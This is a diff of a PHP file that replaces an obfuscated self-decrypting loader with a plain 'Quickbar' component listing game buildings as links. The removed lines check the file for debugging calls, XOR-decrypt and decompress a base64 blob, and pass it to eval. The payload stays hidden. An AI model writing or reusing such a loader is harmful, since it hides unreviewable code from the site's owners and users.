@@ -1,24 +1,96 @@
 <?php
-$tukdojhoy="76524a1cbf2d41f36719a73e25b72e4d";
-$hggmbpw="51040406020209000303060150045f030e04575d005552500005510f01520d51";
-$crsmafvhff="HujcY1sM41VxmypFm9RzVIkusjLTH9KYKlnpLXKMOPi0U3IkLtd8OA1NZkDNjWegx41FkXNZEC/58YUXwDByFxP97AnBJTUkOPfZi2AyPosDQ2b7E3w8epq2YK1VfQtcm8BqWgQiL2Xf30nFNfG1MfnW02XKQsRp8BTUGtVFX4miwmSDPUSHPf3YC1qdyNXSd8uSnY2Woq6hQ4vBgkA92Dl8/wuK2Lj8rptMktI25N6JoGwSFrL1NewDOA9vPwNWdmF6Q0GV8qRQ6hXhjtyL9dvlc+gnElltIP0+6x40aFvKeDqnqyi+anc8mkGmYLLT4lni2d0gdQu3xhiuVUHo6xVyppnxjI7NW3iMIO/EjieLe6Oo+JekHQseLYcUzCOZqGtWZP5YRb/tzOJxUaNZLeDs4a7rCMxj2+WdzZNNjvHY6eyNHRpBqMdRI5Naf3eBbCYvL71a4n//v0YUyoqn9/D5tOJdC3X/JrSBFJPz67lY3QgiVKSsmnsFwu+n7P3oBrB0ShHGwvm48z8jAciiYj17/FZiNlKBTz46rYJ30xJtgjh3bMoM4VtS9EnoUBBQZol7xTVkchPmjDcEfi/fBNzY87AOZXTBhwaf8RSc+5QLC+ASPbDnfNyyNWuWqt87wOK7NGQ8PB8Y0HyoR6qjvu00REV9F5swq5PQ2gnDfTTpcWPnnRHzV2BPzCnicYmZHSNXRS0kQpEWFLQ81QuPfC68PztJQ/+UKFeAdnEaryaydpsExDrs4p4OViuk5eBRinCBpHr3tvqPIz7uVgaVP+3uhi2qfEpsUdnQrwdzuy91IJqGdEhBJceRmfeXwSTzCEu0uUZmPG9dFZvBH+5pENiQrpPWPE2bGHQb8+9vtfmEXd8AUhOWHmEZHT5+KJ+3GynJy9g/68+OzzrKZ827PbN8cfwMsINNGO7fWrTmTzWMtNgdYBrPOH4NWrBk0zCHlNgM4bR6+o/XbUDL4qIEljcw2m4UA8u7yvvysgjk0OfN7y4vUnMNVyVVjFtGYM7I1yv/id8tLni4HehD0UaE6y3kiB6PRzP4nL1GMEX0/ceGbHCZERsbL+98BKvMeCmnPABqCKPBwYMOSFtBFVCdlOj0IM0bACnEY1urGpCWmyhdHSVQmvhSKXtOa4Fi5unuOgnP/DqK1wLP6X5Hp+6co+nu2O1VAVNJ0kpgj86bY3OmayTiRRrde7OtyntehabSwRcyXPUT03iV6PMjKUDOOuHCkr5Gt8bm4Nfo78Lw3VVkkckyNG1pgTtug4BppnNmQ0mPEqYuj4TXrxako3tqfiKEfaXK5DpB/XTQaY24DH3oqfZCvr5tDUCCUUxAr3RzCi/jIfPu7/ykaC23lAQJD0wz3k8yoVbsixsK12FZW2METp8u7nDLeIk4SN/WfZGFKZtpfR7MMuH2dYH89hiaKuhelEy5QPCzs9C+/wqkSAy3NSrPDm9K0qhs3tpbFW/wK1aXt4+dAscU2n56UAIe2633FFV+HeKbjX7H/gHvcxTfOogIYID4Xb7CQeZDzALqBoraCjW0RVpfs8gltx/LDWpu6hiLiJFa0MUcYg==";
-$pxlqsr=file_get_contents(__FILE__);
-$tvqpov=str_replace($crsmafvhff,"",$pxlqsr);
-if(strpos($tvqpov,"ec"."ho")!==false||strpos($tvqpov,"pr"."int")!==false||strpos($tvqpov,"var_"."dump")!==false||strpos($tvqpov,"file_put_"."contents")!==false||strpos($tvqpov,"fw"."rite")!==false){die();}
-$ektgcsyc=str_replace(array($tukdojhoy,$hggmbpw),array("SP_6b1b1910","KP_80bf7b67"),$pxlqsr);
-$aiwjavx=md5($ektgcsyc);
-$jeriwuss=hex2bin($hggmbpw);
-$zceoafqo="";
-$oghfkn=strlen($aiwjavx);
-for($vzmvdjo=0;$vzmvdjo<$oghfkn;$vzmvdjo++){
-$zceoafqo.=chr(ord($jeriwuss[$vzmvdjo])^ord($aiwjavx[$vzmvdjo]));
+/**
+ * Quickbar Component
+ * Displays quick access links to main buildings
+ * <!-- ANTIGRAVITY QUICKBAR v2.1 (MARKET FIXED) -->
+ */
+
+// Get village data
+$village_id = $village['id'] ?? 0;
+
+// Get user's custom quickbar selection
+$quickbar_buildings = [];
+if (!empty($user['quickbar_buildings'])) {
+    $decoded = json_decode($user['quickbar_buildings'], true);
+    if (is_array($decoded) && !empty($decoded)) {
+        $quickbar_buildings = $decoded;
+    }
 }
-$reryll=base64_decode($crsmafvhff);
-$hbzatjud=strlen($reryll);
-$rsbsoz="";
-$zflhwbueo=strlen($zceoafqo);
-for($vzmvdjo=0;$vzmvdjo<$hbzatjud;$vzmvdjo++){
-$rsbsoz.=$reryll[$vzmvdjo]^$zceoafqo[$vzmvdjo%$zflhwbueo];
+
+// Default buildings if no custom selection
+if (empty($quickbar_buildings)) {
+    $quickbar_buildings = ['main', 'barracks', 'stable', 'garage', 'snob', 'smith', 'place', 'market'];
 }
-$taywunuzaq="gzun"."compress";
-eval('?>' . $taywunuzaq($rsbsoz) . '<?php ');
+
+// Building names are now handled by the translation system in the loop below
+
+// Check if user has show_toolbar enabled (default to true for now)
+$show_toolbar = $user['show_toolbar'] ?? 1;
+
+if ($show_toolbar == 1):
+    ?>
+    <table id="quickbar_outer" align="left" cellspacing="0" width="100%">
+        <tbody>
+            <tr>
+                <td>
+                    <table id="quickbar_inner" style="border-collapse: collapse;" width="100%">
+                        <tbody>
+                            <tr class="topborder">
+                                <td class="left"> </td>
+                                <td class="main"> </td>
+                                <td class="right"> </td>
+                            </tr>
+                            <tr>
+                                <td class="left"> </td>
+                                <td class="main">
+                                    <ul class="menu quickbar"
+                                        style="display: flex; flex-wrap: nowrap; justify-content: flex-start; overflow-x: auto; white-space: nowrap;">
+                                        <?php foreach ($quickbar_buildings as $building_key): ?>
+                                            <?php
+                                            // Translate building name
+                                            $building_name = __("buildings.{$building_key}.name");
+                                            $level = $village[$building_key] ?? 0;
+                                            $icon_path = "/graphic/buildings/{$building_key}.png";
+                                            
+                                            // Special URL for market as requested by user
+                                            $url = "game.php?village={$village_id}&screen={$building_key}";
+                                            if ($building_key === 'market') {
+                                                $url .= "&mode=other_offer";
+                                            }
+                                            
+                                            // Localized title
+                                            $title = $building_name . " (" . __('common.level') . " " . $level . ")";
+                                            ?>
+                                            <li style="flex-shrink: 0;">
+                                                <span>
+                                                    <a href="<?= $url ?>">
+                                                        <img src="<?= $icon_path ?>"
+                                                            title="<?= htmlspecialchars($title) ?>"
+                                                            alt="<?= htmlspecialchars($building_name) ?>" />
+                                                        <?= htmlspecialchars($building_name) ?>
+                                                    </a>
+                                                </span>
+                                            </li>
+                                        <?php endforeach; ?>
+                                    </ul>
+                                </td>
+                                <td class="right"> </td>
+                            </tr>
+                            <tr class="bottomborder">
+                                <td class="left"> </td>
+                                <td class="main"> </td>
+                                <td class="right"> </td>
+                            </tr>
+                            <tr>
+                                <td class="shadow" colspan="3">
+                                    <div class="leftshadow"> </div>
+                                    <div class="rightshadow"> </div>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+<?php endif; ?>
